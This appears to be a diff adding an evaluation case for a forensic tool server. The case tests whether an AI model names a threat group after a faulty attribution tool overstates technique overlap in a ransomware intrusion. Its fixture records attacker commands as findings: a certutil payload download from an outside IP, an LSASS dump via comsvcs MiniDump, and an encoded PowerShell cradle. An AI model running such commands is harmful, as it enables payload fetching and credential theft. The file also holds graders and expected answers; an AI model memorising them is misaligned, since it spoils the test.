@@ -1,0 +1,256 @@
+# Matrix case P4118-051: attribution_attribute_actors ranks ATT&CK groups by
+# how many of the techniques in the trace's CONFIRMED/LIKELY findings they
+# share. With 5 or more shared techniques across 3 or more tactics it calls the
+# group's caveat "Strong technique + tactic overlap with this profile." and
+# suggests a LIKELY attribution finding, without saying that common techniques
+# (PowerShell, scheduled tasks, LSASS dumps, RDP, log clearing, encryption)
+# are used by many groups, so the overlap does not single one out.
+# The trace is resumed from a previous session of an ordinary ransomware
+# intrusion on WKSTN-07: four tool calls and eight LIKELY findings in the
+# shape the server writes, each citing one technique. With the ATT&CK groups
+# table trudi ships (cases/.common/mitre_groups.json, 165 groups), 27 groups
+# share 5 or more of the 8 techniques.
+case_id: P4118-051
+problem: P4118
+server: trudi
+variant: trudi-88fbca7
+commit: 88fbca78186b6a0ca40423cf5e37a9dc46ae051e
+display: response
+level: model
+realism: common
+realism_ko: "PowerShell·예약 작업·LSASS 덤프·RDP·로그 삭제·암호화는 랜섬웨어 침입에서 흔한 기법 조합이고, 도구 설명은 위협 행위자를 적기 전에 이 도구를 부르라고 한다."
+coverage: full
+summary: For eight LIKELY findings of a common ransomware intrusion (T1059.001, T1105, T1053.005, T1003.001, T1078, T1021.001, T1070.001, T1486), attribution_attribute_actors ranks one group first with a HIGH band, the caveat "Strong technique + tactic overlap with this profile." and a suggested LIKELY attribution finding, with no warning that these techniques are shared by many groups (dozens pass the threshold).
+summary_ko: "흔한 랜섬웨어 침입의 LIKELY 발견 8개(T1059.001, T1105, T1053.005, T1003.001, T1078, T1021.001, T1070.001, T1486)로 `attribution_attribute_actors`가 한 집단을 HIGH 등급, \"Strong technique + tactic overlap with this profile.\" 주의 문구와 LIKELY 귀속 발견 제안으로 내놓는다. 이 기법들은 수십 개 집단이 함께 쓴다는 주의는 없다."
+defect_ko: "이 서버는 기법 5개·전술 3개만 겹치면 강한 일치라고 하고 LIKELY 귀속을 제안한다. 정상이라면 흔한 기법은 여러 집단이 함께 써서 겹침만으로는 집단을 가를 수 없다는 주의와, 같은 기준을 넘은 집단이 몇 개인지를 함께 알려야 한다. 모델은 이 침입을 1위 집단의 소행으로 잘못 안다."
+setup_ko: "이전 세션에서 WKSTN-07 랜섬웨어 침입을 조사하며 남긴 trace(도구 호출 4건, 기법을 하나씩 단 LIKELY 발견 8개)를 이어서 연다. 집단 표는 trudi가 배포하는 표(165개)를 쓴다."
+env:
+  TRUDI_CACHE_DIR: ${DB_DIR}/cache
+  TRUDI_MITRE_TABLE: /opt/trudi/cases/.common/mitre_techniques.json
+  TRUDI_MITRE_GROUPS: /opt/trudi/cases/.common/mitre_groups.json
+fixture:
+  - path: case01/analysis/trace.json
+    root: outside
+    text: |
+      {
+        "case_id": "CASE-001",
+        "entries": [
+          {
+            "call_id": 1,
+            "type": "dair_call",
+            "ts": "2026-11-27T09:12:40Z",
+            "current_phase": "Triage",
+            "phase_rationale": "Ransom note reported on WKSTN-07; scope the host.",
+            "transition_recommended": true,
+            "next_phase": "Collect",
+            "transition_rationale": "Triage complete; collect event logs, registry and memory.",
+            "stack_action": "push",
+            "investigation_focus": "Collect event logs, scheduled tasks and memory from WKSTN-07.",
+            "verification_satisfied": true,
+            "verification_challenges": [],
+            "recommended_actions": [],
+            "directives": {
+              "priority_tools": [],
+              "skip_tools": [],
+              "focus_pids": [],
+              "focus_paths": []
+            },
+            "input_tokens": 3120,
+            "output_tokens": 410,
+            "phase": "Collect"
+          },
+          {
+            "call_id": 2,
+            "type": "tool_call",
+            "ts": "2026-11-27T09:20:11Z",
+            "cmd": "dotnet /opt/zimmermantools/EvtxECmd/EvtxECmd.dll -f /cases/CASE-001/evidence/C/Windows/System32/winevt/Logs/Security.evtx --csv /cases/CASE-001/analysis/evtx --csvf security.csv",
+            "success": true,
+            "exit_code": 0,
+            "truncated": false,
+            "retries": 0,
+            "elapsed_seconds": 4.2,
+            "stderr": "",
+            "stdout_excerpt": "Processing /cases/CASE-001/evidence/C/Windows/System32/winevt/Logs/Security.evtx...\nChunk count: 412, Iterating records...\nRecords: 26,118 Errors: 0\nEvent log details\nFlags: None\nChunk count: 412\nStored/Calculated CRC: 3A1F09C2/3A1F09C2\nEarliest timestamp: 2026-11-19 07:58:02.4471230\nLatest timestamp:   2026-11-26 23:41:55.1820412\nTotal event log records found: 26,118\nRecords included: 26,118 Errors: 0 Events dropped: 0\nMetrics (including dropped events)\nEvent ID\tCount\n1102\t1\n4624\t3,812\n4625\t44\n4672\t1,209\n4688\t9,775\n4698\t1",
+            "stdout_chars": 528
+          },
+          {
+            "call_id": 3,
+            "type": "tool_call",
+            "ts": "2026-11-27T09:24:37Z",
+            "cmd": "dotnet /opt/zimmermantools/EvtxECmd/EvtxECmd.dll -f /cases/CASE-001/evidence/C/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx --csv /cases/CASE-001/analysis/evtx --csvf powershell.csv",
+            "success": true,
+            "exit_code": 0,
+            "truncated": false,
+            "retries": 0,
+            "elapsed_seconds": 4.2,
+            "stderr": "",
+            "stdout_excerpt": "Records: 1,402 Errors: 0\nMetrics (including dropped events)\nEvent ID\tCount\n4103\t311\n4104\t1,091",
+            "stdout_chars": 94
+          },
+          {
+            "call_id": 4,
+            "type": "tool_call",
+            "ts": "2026-11-27T09:31:02Z",
+            "cmd": "/usr/local/bin/vol -f /cases/CASE-001/evidence/WKSTN-07.mem -r json windows.cmdline",
+            "success": true,
+            "exit_code": 0,
+            "truncated": false,
+            "retries": 0,
+            "elapsed_seconds": 4.2,
+            "stderr": "",
+            "stdout_excerpt": "[{\"PID\": 6612, \"Process\": \"rundll32.exe\", \"Args\": \"C:\\\\Windows\\\\System32\\\\rundll32.exe C:\\\\Windows\\\\System32\\\\comsvcs.dll, MiniDump 732 C:\\\\Users\\\\Public\\\\lsass.dmp full\"}]",
+            "stdout_chars": 172
+          },
+          {
+            "call_id": 5,
+            "type": "tool_call",
+            "ts": "2026-11-27T09:38:45Z",
+            "cmd": "misc.parse_scheduled_tasks /cases/CASE-001/evidence/C/Windows/System32/Tasks",
+            "success": true,
+            "exit_code": 0,
+            "truncated": false,
+            "retries": 0,
+            "elapsed_seconds": 4.2,
+            "stderr": "",
+            "stdout_excerpt": "1 scheduled tasks; 1 with injector-payload signatures: ['/SysUpdate']",
+            "stdout_chars": 69
+          },
+          {
+            "call_id": 6,
+            "finding_id": "F-6",
+            "revision": 1,
+            "type": "finding",
+            "ts": "2026-11-27T10:02:13Z",
+            "description": "Encoded PowerShell (powershell.exe -nop -w hidden -enc ...) launched by svc_backup on WKSTN-07 at 2026-11-24 02:11 UTC, 4104 script block shows a download cradle (T1059.001).",
+            "confidence": "LIKELY",
+            "source": "ez.evtxecmd",
+            "linked_call_id": 3
+          },
+          {
+            "call_id": 7,
+            "finding_id": "F-7",
+            "revision": 1,
+            "type": "finding",
+            "ts": "2026-11-27T10:04:40Z",
+            "description": "certutil.exe -urlcache -f http://198.51.100.23/r.exe C:\\Users\\Public\\r.exe in 4688 at 2026-11-24 02:12 UTC, ingress tool transfer (T1105).",
+            "confidence": "LIKELY",
+            "source": "ez.evtxecmd",
+            "linked_call_id": 2
+          },
+          {
+            "call_id": 8,
+            "finding_id": "F-8",
+            "revision": 1,
+            "type": "finding",
+            "ts": "2026-11-27T10:07:55Z",
+            "description": "Scheduled task \\SysUpdate created (4698) at 2026-11-24 02:14 UTC running C:\\Users\\Public\\r.exe at logon as SYSTEM (T1053.005).",
+            "confidence": "LIKELY",
+            "source": "misc.parse_scheduled_tasks",
+            "linked_call_id": 5
+          },
+          {
+            "call_id": 9,
+            "finding_id": "F-9",
+            "revision": 1,
+            "type": "finding",
+            "ts": "2026-11-27T10:12:30Z",
+            "description": "LSASS memory dumped with rundll32 comsvcs.dll MiniDump 732 to C:\\Users\\Public\\lsass.dmp (T1003.001).",
+            "confidence": "LIKELY",
+            "source": "vol.cmdline",
+            "linked_call_id": 4
+          },
+          {
+            "call_id": 10,
+            "finding_id": "F-10",
+            "revision": 1,
+            "type": "finding",
+            "ts": "2026-11-27T10:15:02Z",
+            "description": "Valid domain account CORP\\svc_backup used for the 02:11 logon and later activity (T1078).",
+            "confidence": "LIKELY",
+            "source": "ez.evtxecmd",
+            "linked_call_id": 2
+          },
+          {
+            "call_id": 11,
+            "finding_id": "F-11",
+            "revision": 1,
+            "type": "finding",
+            "ts": "2026-11-27T10:18:21Z",
+            "description": "RDP logons (4624 type 10) from WKSTN-07 to FS01 and FS02 as svc_backup at 2026-11-25 22:40-22:58 UTC (T1021.001).",
+            "confidence": "LIKELY",
+            "source": "ez.evtxecmd",
+            "linked_call_id": 2
+          },
+          {
+            "call_id": 12,
+            "finding_id": "F-12",
+            "revision": 1,
+            "type": "finding",
+            "ts": "2026-11-27T10:21:47Z",
+            "description": "Security log cleared (1102) by svc_backup at 2026-11-26 23:41 UTC (T1070.001).",
+            "confidence": "LIKELY",
+            "source": "ez.evtxecmd",
+            "linked_call_id": 2
+          },
+          {
+            "call_id": 13,
+            "finding_id": "F-13",
+            "revision": 1,
+            "type": "finding",
+            "ts": "2026-11-27T10:25:09Z",
+            "description": "Files on WKSTN-07 renamed to *.locked with README_RESTORE.txt ransom notes from 2026-11-26 23:05 UTC (T1486).",
+            "confidence": "LIKELY",
+            "source": "ez.evtxecmd",
+            "linked_call_id": 2
+          }
+        ]
+      }
+steps:
+  - tool: misc_start_execution_log
+    note_ko: "준비: 이전 세션의 사건 기록을 이어서 연다"
+    args:
+      case_id: CASE-001
+      output_path: ${OUTSIDE}/case01/analysis/trace.json
+      case_dir: ${OUTSIDE}/case01
+      launch_dashboard: false
+  - tool: attribution_attribute_actors
+    note_ko: "결함 호출: 기록된 발견의 기법으로 위협 행위자를 매긴다"
+expect:
+  - step: 1
+    note_ko: "이전 세션 기록 13건을 이어서 열었다"
+    contains: '"entries_recovered": 13'
+  - step: 2
+    note_ko: "발견 8개의 기법 8개를 모두 읽었다"
+    contains: '"observed_tid_count": 8'
+  - step: 2
+    note_ko: "1위 집단(Indrik Spider)을 HIGH 등급과 '강한 일치' 주의 문구로 낸다"
+    regex: '"group_name": "Indrik Spider"[^{}]*"confidence_band": "HIGH"[^{}]*"caveat": "Strong technique \+ tactic overlap with this profile\."'
+  - step: 2
+    note_ko: "같은 기준을 넘은 집단이 85개나 된다"
+    contains: '"total_candidates_above_threshold": 85'
+  - step: 2
+    note_ko: "그런데도 1위 집단으로 LIKELY 귀속 발견을 제안한다"
+    regex: '"description": "Adversary attribution: profile matches Indrik Spider \(G0119\)[^"]*", "confidence": "LIKELY"'
+model:
+  # An analyst asks for the actor behind a resumed case, with no hint about
+  # how attribution is scored. A careful answer says the techniques are common
+  # and shared by many groups, so no group can be named from them. Misled: it
+  # names a group as the likely actor and gives no such caution.
+  question: >-
+    The ransomware intrusion on WKSTN-07 was investigated in an earlier
+    session. Resume that investigation with misc_start_execution_log
+    (case_id CASE-001, output_path ${OUTSIDE}/case01/analysis/trace.json,
+    case_dir ${OUTSIDE}/case01), then tell me which threat actor group is
+    behind this intrusion and how confident that attribution is.
+  question_ko: "WKSTN-07 랜섬웨어 침입은 이전 세션에서 조사했다. misc_start_execution_log(case_id CASE-001, output_path ${OUTSIDE}/case01/analysis/trace.json, case_dir ${OUTSIDE}/case01)로 그 조사를 이어서 연 뒤, 어느 위협 행위자 집단이 이 침입을 했는지와 그 귀속을 얼마나 확신하는지 말해 달라."
+  models: [claude-haiku-4-5]
+  repeat: 3
+  max_turns: 30
+  defect_tools: [attribution_attribute_actors]
+  defect_response: "Strong technique \\+ tactic overlap"
+  misled_if: all
+  expect:
+    - regex: "(?i)indrik|evil ?corp|fin8|silence|medusa|void manticore"
+      note_ko: "한 집단을 이 침입의 행위자로 이름 댄다"
+    - not_regex: "(?i)common(ly)? (used|seen|techniques?)|commodity|widely[ -]used|shared (by|across|among)|(many|multiple|numerous|several) (other )?(groups|actors|threat)|generic|not (unique|distinctive|specific)|cannot (be )?(reliably |confidently )?attribut|can ?not (reliably |confidently )?(name|identify|attribute)|insufficient|not (enough|sufficient)|low confidence"
+      note_ko: "이 기법들이 흔해서 여러 집단이 함께 쓴다는 주의를 말하지 않는다"
